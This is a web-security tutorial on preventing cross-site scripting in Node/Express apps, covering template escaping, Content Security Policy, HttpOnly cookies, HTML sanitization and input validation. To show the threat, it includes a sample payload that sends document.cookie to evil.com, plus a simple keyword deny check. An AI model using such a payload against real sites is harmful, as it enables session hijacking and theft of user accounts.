# XSS Prevention

Cross-Site Scripting, or XSS, happens when an attacker injects malicious scripts into your web pages. Other users visiting the page run those scripts unknowingly. The script can steal cookies, redirect users, or modify page content.

## Types of XSS

**Stored XSS:** The script is saved to your database and shown to other users. Like someone posting a comment containing `<script>` tags that runs when others view the page.

**Reflected XSS:** The script is in the URL or form input and reflected back in the response. Like a search page that shows `You searched for: <script>alert(1)</script>` without escaping.

**DOM-based XSS:** The script manipulates the page's DOM directly on the client side, without server involvement. Like using `innerHTML` with untrusted data.

## Escaping Output

The most important defense is escaping user input before displaying it. Template engines do this by default:

```html
<!-- EJS escapes automatically -->
<p><%= userInput %></p>

<!-- Pug escapes automatically -->
p= userInput

<!-- Handlebars escapes automatically -->
<p>{{userInput}}</p>
```

Never use unescaped output for user data:

```html
<!-- DANGEROUS: renders raw HTML -->
<p><%- userInput %></p>
<p>!{userInput}</p>
<p>{{{userInput}}}</p>
```

If `userInput` is `<script>document.location='http://evil.com?cookie='+document.cookie</script>`, escaped output shows it as text. Unescaped output runs it as code.

## Content Security Policy

CSP tells browsers which sources of content are allowed. Even if an attacker injects a script, CSP can block it from running:

```js
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],          // Only scripts from same origin
    styleSrc: ["'self'"],
    imgSrc: ["'self'", 'data:'],
    objectSrc: ["'none'"],          // No Flash or Java
    baseUri: ["'self'"],
    formAction: ["'self'"]
  }
}));
```

The `'self'` keyword means only content from the same origin is allowed. No inline scripts, no external CDN scripts unless you explicitly allow them.

## HttpOnly Cookies

If an XSS attack succeeds, the attacker tries to steal cookies. The `HttpOnly` flag prevents JavaScript from accessing cookies:

```js
app.use(session({
  cookie: {
    httpOnly: true,  // JavaScript cannot read this cookie
    secure: true,    // Only sent over HTTPS
    sameSite: 'lax'
  }
}));
```

With `httpOnly: true`, `document.cookie` returns nothing useful. The session cookie is invisible to client-side scripts.

## Sanitizing HTML

Sometimes you need to allow some HTML, like in a rich text editor. Use a sanitization library:

```bash
npm install sanitize-html
```

```js
const sanitizeHtml = require('sanitize-html');

const clean = sanitizeHtml(userInput, {
  allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  allowedAttributes: {
    'a': ['href']
  }
});
```

This strips dangerous tags while keeping safe formatting. Never try to write your own HTML sanitizer. There are too many edge cases and bypass techniques.

## Input Validation

Validate input on the server, not just the client:

```js
app.post('/comment', (req, res) => {
  const { comment } = req.body;

  // Reject obviously malicious input
  if (comment.includes('<script') || comment.includes('javascript:')) {
    return res.status(400).send('Invalid input');
  }

  // Even better: use a validation library
  // We will cover express-validator later
});
```

XSS prevention is a layered defense. Escape output, set CSP headers, use HttpOnly cookies, and sanitize any HTML you allow. No single measure is enough, but together they stop most attacks.
